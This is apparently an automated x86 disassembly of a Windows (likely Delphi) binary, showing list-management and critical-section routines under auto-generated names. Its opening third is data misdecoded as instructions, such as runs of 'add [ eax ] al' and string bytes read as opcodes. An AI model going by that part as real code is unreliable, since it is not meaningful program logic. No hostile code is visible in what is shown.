add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x41 ] cl
add [ eax ] dl
add [ eax ] al
add [ eax + 0x41 ] ah
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add al dl
pop ebx
inc ecx
add [ esp + ebx * 2 ] bl
inc ecx
add [ esp + ebx * 2 ] dh
inc ecx
add [ edx ] ah
inc ecx
add [ edx + ebp + 0x625c0040 ] cl
inc ecx
add [ eax + 0x5d ] bl
inc ecx
add [ ebx ] dl
push esp
inc ebx
jne r-xdata
popad
pop eax
pop ebp
je r-xdata
insb
push ebx
je r-xdata
outsb
jae r-xdata
add al dh
insd
fsub [ eax ]
inc ecx
add [ edi ] al
pop es
push esp
push ebx
je r-xdata
popad
inc eax
add [ eax + 0x32 ] cl
inc eax
add al dl
pop ebx
inc ecx
add [ ebp + 0x20b00040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
and [ ecx ] al
add al 0x0
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
jns r-xdata
push ebx
je r-xdata
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or eax 0x72745354
imul ebp [ esi + 0x67 ] 0x65727453
popad
insd
mov al 0x23
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
and eax [ ecx ]
sbb [ eax ] al
add [ eax ] al
in al 0x21
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x2fffbe9a ] dl
pop ebx
inc ecx
add [ esp + ebx * 2 ] bl
inc ecx
add [ esp + ebx * 2 ] dh
inc ecx
add [ edx ] ah
inc ecx
add al cl
inc cx
add [ edx + 0x41 ] bl
add [ eax + 0x5d ] bl
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
push ebx
inc ecx
add [ eax + 0x63 ] dl
inc ecx
add [ 0x6d654d54 ] cl
inc ecx
add [ eax + 0x5d ] bl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ ebp + 0x21440040 ] cl
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x21 ] ah
inc ecx
add [ eax ] cl
add [ eax ] al
add [ eax + 0x41 ] ah
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
rcr [ ebx + 0x41 ] 0x1
je r-xdata
outsd
jb r-xdata
insd
popad
insd
lodsb [ esi ]
and al [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax + 0x65 ] al
inc ecx
add [ esp + ebx * 2 ] dh
inc ecx
add [ eax + 0x64 ] dh
inc ecx
add [ eax - 0x17ffbe9c ] dh
inc ecx
add [ eax + 0x5d ] bl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
popad
insd
mov eax eax
sub [ ebx ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x23 ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
and [ fs : ecx ] al
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add al dl
pop ebx
inc ecx
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
arpl [ ebp + 0x53 ] sp
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_412281
and al [ ecx ]
adc al 0x0
add [ eax ] al
in al 0x21
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x2fffbe9e ] al
pop ebx
inc ecx
add [ ebx ] ah
inc ecx
add [ esp + ebx * 2 ] dh
inc ecx
add [ edx ] ah
inc ecx
add ah bl
arpl [ ecx ] ax
pop esp
bound eax [ ecx ]
pop eax
pop ebp
inc ecx
add [ eax + 0x63 ] dl
inc ecx
add [ 0x6d654d54 ] cl
outsd
jb r-xdata
add [ eax + edx + 0x40040 ] dl
add [ eax ] al
or eax 0x72745354
imul ebp [ esi + 0x67 ] 0x65727453
popad
insd
mov al 0x23
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
and eax [ ecx ]
sbb [ eax ] al
add [ eax ] al
in al 0x21
inc ecx
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x2fffbe9a ] dl
pop ebx
inc ecx
add [ esp + ebx * 2 ] bl
inc ecx
add [ esp + ebx * 2 ] dh
inc ecx
add [ edx ] ah
inc ecx
add al cl
inc cx
add [ edx + 0x41 ] bl
add [ eax + 0x5d ] bl
inc ecx
add [ edi ] cl
push esp
push edx
jae r-xdata
push ebx
je r-xdata
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
jne r-xdata
add [ ecx ] al
add [ eax ] al
popad
insd
mov eax eax
sub [ ebx ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x41 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x23 ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
and [ fs : ecx ] al
mov al [ 0xffffffffac004034 ]
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add al dl
pop ebx
inc ecx
add [ eax + 0x65 ] al
inc ecx
add [ esp + ebx * 2 ] dh
inc ecx
add [ eax + 0x64 ] dh
inc ecx
add [ eax - 0x17ffbe9c ] dh
inc ecx
add [ eax + 0x5d ] bl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
mov eax [ eax ]
jmp [ eax + 0x24 ]
and al 0x4
arpl [ ebp + 0x53 ] sp
je r-xdata
pushad
and al 0x83
inc esp
and al 0x4
in al dx
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
popad
insd
int3
sub_4124f4
into
and al 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x25 ] ch
inc ecx
add [ eax ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insd
inc ecx
popad
jo r-xdata
or al 0x0
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x700040 ] dl
add [ eax ] al
pop es
push esp
push edx
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax - 0x5fffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] ch
inc ecx
add [ eax + 0x67 ] dl
inc ecx
add [ edx + ebp + 0x2a8c0040 ] cl
inc eax
add [ edx + ebp + 0x54060040 ] cl
inc esi
imul ebp [ ebp + 0x72 ] 0x41268490
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
aam 0x8b
inc esp
and al 0x4
mov eax [ eax ]
jmp [ eax + 0x28 ]
outsb
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esi 0x7c004126
add [ eax ] al
mov [ edi + 0x40 ] ch
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ edi ] al
inc ebp
push esp
push 0x64616572
and [ edi ] ah
inc ecx
add [ edx ] cl
push cs
push esp
inc ebx
outsd
insd
jo r-xdata
rcl [ edi ] 0x41
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] dl
inc ecx
add [ eax + eax ] cl
add [ eax ] al
add [ ecx + edx + 0x34a00040 ] dl
inc eax
add [ edi + edx * 2 + 0x40 ] al
add [ eax + 0x57 ] dl
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add [ eax + 0x57 ] ah
inc eax
add [ edx + esi ] cl
inc eax
add [ ebp + 0x41 ] ch
add [ ebp - 0x59f3ffbf ] ah
inc ecx
add [ esi + 0x41 ] dh
add al bh
cmpsb [ esi ] [ edi ]
inc ecx
add [ edi + 0x41 ] bl
add [ ecx + ebp * 4 + 0x41 ] bl
add [ eax - 0x57 ] ch
inc ecx
add [ ecx + ebp * 4 + 0x41 ] dh
add [ eax - 0x73ffbe57 ] al
test eax 0xaa080041
inc ecx
add [ esi ] cl
push esp
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x18004125
les esp [ 0x41 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les esp [ 0x80041 ]
add [ eax ] al
mov al [ 0xffffffffa0004010 ]
xor al 0x40
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] ah
xor eax 0x540c0041
inc ebx
insb
popad
jae r-xdata
add bh bh
pushad
sub [ ebx - 0x27fbdbbc ] al
jmp sub_41a1fc
popad
insd
xor al 0x27
inc ecx
add [ edi ] cl
cmovns eax [ ebp + 0x73 ]
imul esp [ edi + 0x6e ] 0x6f4e7265
je r-xdata
add [ eax ] al
add ah dl
and eax 0x34a00041
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add al ch
insd
inc ecx
add [ eax + 0x67 ] dl
inc ecx
add [ eax + 0x6e ] cl
inc ecx
add [ esi + ebp * 2 + 0x41 ] bh
add [ eax + 0x6c004171 ] dl
outsd
inc ecx
add [ eax - 0x73ffbe70 ] bl
outsd
inc ecx
add [ eax - 0x6f ] ch
inc ecx
add [ eax - 0x6f ] dl
inc ecx
add ah cl
jle r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x7c004126 ] bh
inc esi
imul ebp [ esi + 0x64 ] 0x408d7265
add [ eax ] ah
inc ecx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and al 0x4
aam 0xe9
jpe r-xdata
jns r-xdata
add ah cl
jno r-xdata
pop es
inc ebx
insb
popad
jae r-xdata
adc [ eax ] eax
add [ edi ] eax
call 0xffffffffe3e7e0c1
rcl [ ecx ] 0x1
stosb [ edi ]
mov cl 0x0
ror [ edi - 0x4f ] 0x6f
mov esp 0x616c4307
int 0x6b
dec edi
add [ ecx + 0x51 ] 0xed
mov dh 0x27
inc ecx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
inc ecx
add [ edi + 0x27 ] bh
inc ecx
add [ ecx + 0x69004127 ] cl
daa
inc ecx
add [ ebx - 0x5effbed9 ] dl
daa
inc ecx
add [ ebx + 0x2004127 ] ch
add [ eax ] al
add [ eax + 0x18 ] bl
mov esp edx
xchg ah ch
pop ecx
inc ebp
jae r-xdata
dec [ ebx - 0x3f7c3340 ]
fsubr st1

add bh bh
sub_412ae8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ed8
pop edi
pop esi
pop ebx
retn
sub_412b10
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ebc
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412b38
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_405ee0
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
sub_412c30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] edx
mov [ esp ] eax
xor ebp ebp
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebp
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test ebp ebp
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0xc ]
mov edx edi
call sub_413f44
mov ebx eax
mov edx ebx
mov eax [ esp + 0x4 ]
call sub_403484
test al al
je r-xdata
mov ebp ebx
mov edx ebp
mov eax ebx
call sub_403484
test al al
je r-xdata
sub_412c90
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx [ ebp + 0x8 ]
test edi edi
je r-xdata
xor esi esi
mov edx ebx
mov eax edi
call sub_412c30
mov esi eax
jmp r-xdata
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_412c30
mov ebx eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
test esi esi
jne r-xdata
mov edx ebx
mov eax esi
call sub_403484
test al al
je r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_412d00
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0xc ] esi
mov eax esi
mov edx edi
call sub_413de8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_412d7c
push ebx
push esi
call sub_4035e4
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
mov eax [ esi + 0x4 ]
call sub_403258
mov eax [ esi + 0x8 ]
call sub_403258
mov eax [ esi + 0xc ]
call sub_403258
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
sub_412dbc
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
mov eax [ ebp + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
mov ebx eax
test ebx ebx
jl r-xdata
inc esi
xor ebx ebx
xor edi edi
mov eax [ ebp + 0x8 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx ebx
call sub_413f44
mov edi eax
mov edx [ esp ]
mov eax edi
call sub_4031bc
test al al
jne r-xdata
sub_412e1c
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0xc ]
mov edx esi
call sub_413f44
mov edx eax
mov eax ebp
call sub_403484
test al al
jne r-xdata
sub_412e60
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_412efb
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_4031a8
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_40420c
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_412dbc
test eax eax
je r-xdata
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_413de8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412f02
lea eax [ ebp - 0x4 ]
call sub_403fa8
retn
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10c ] eax
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7f0
call sub_4039e4
sub_412f20
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
call sub_405048
cmp ebx eax
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_412f40
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413f44
mov edx edi
call sub_412f20
test al al
je r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413f44
mov edx edi
call sub_412f20
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0xc ]
call sub_413e34
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx edi
call sub_412f20
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4 ]
call sub_413e34
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_412fe4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
mov eax [ edi + 0x20 ]
cmp eax [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
mov [ edi + 0x20 ] eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebp ebp
mov eax [ edi + 0x4 ]
mov edx ebp
call sub_413f44
mov ebx eax
mov edx [ esp ]
mov eax ebx
call sub_412e1c
mov [ ebx + 0x10 ] al
inc ebp
dec esi
jne r-xdata
sub_413030
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ edi + 0x4 ] eax
lea eax [ edi + 0x8 ]
push eax
call InitializeCriticalSection
mov ecx [ r-xdata ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_412d00
mov esi eax
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413de8
mov [ esi + 0x10 ] 0x1
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40357c
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035d4
pop [ fs : 0x0 ]
add esp 0xc
sub_4130a4
push ebx
push esi
push edi
push ebp
call sub_4035e4
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
mov eax [ esi + 0x4 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
mov eax [ esi + 0x4 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
inc ebp
xor edi edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4035cc
mov eax [ esi + 0x4 ]
mov edx edi
call sub_413f44
call sub_403258
inc edi
dec ebp
jne r-xdata
sub_413100
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor esi esi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov eax [ ebp + 0x4 ]
mov edx edi
call sub_413f44
mov edx [ esp ]
push edx
mov ecx esi
mov edx eax
mov eax [ r-xdata ]
call sub_412c90
mov esi eax
inc edi
dec ebx
jne r-xdata
sub_413144
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebp eax
xor edi edi
mov eax [ ebp + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
test edi edi
jne r-xdata
mov edx [ esp ]
call sub_412dbc
mov edi eax
inc esi
dec ebx
jne r-xdata
mov eax [ ebp + 0x4 ]
mov edx esi
call sub_413f44
cmp [ eax + 0x10 ] 0x0
je r-xdata
sub_413188
push ebp
mov ebp esp
add esp 0xfffffef4
xor eax eax
mov [ ebp - 0x10c ] eax
xor eax eax
push ebp
push sub_41320b
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x108 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4031a8
lea eax [ ebp - 0x108 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x4
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x10c ]
mov eax [ rw-data ]
call sub_405b88
mov ecx [ ebp - 0x10c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b734
call sub_4039e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413212
lea eax [ ebp - 0x10c ]
call sub_403fa8
retn
sub_413218
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_413100
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_412c24
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
push ebp
call sub_413188
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec [ ebp - 0x18 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0x14 ]
call sub_413f44
mov edi eax
cmp edi [ ebp - 0x10 ]
je r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413f44
mov esi eax
mov edx [ ebp - 0xc ]
mov eax esi
call sub_403484
test al al
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_413100
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413e34
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov edx esi
call sub_413de8
sub_413304
push ebx
push esi
push edi
push ebp
push ecx
mov ebp edx
mov edi eax
mov [ esp ] 0x1
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ esp ] 0x0
inc ebx
xor esi esi
mov al [ esp ]
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413f44
mov edx ebp
call sub_412f08
test al al
jne r-xdata
sub_413348
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ecx ebp
mov dl 0x1
mov eax [ r-xdata ]
call sub_412d00
mov edx eax
mov eax [ edi + 0x4 ]
call sub_413de8
inc ebx
xor esi esi
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx esi
call sub_413f44
mov eax [ eax + 0xc ]
mov edx ebp
call sub_413fa0
test eax eax
jge r-xdata
sub_4133a4
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413f44
mov esi eax
mov edx ebp
mov eax esi
call sub_412f40
mov eax [ esi + 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov eax esi
call sub_403258
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_413e34
sub_4133f4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_403228
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
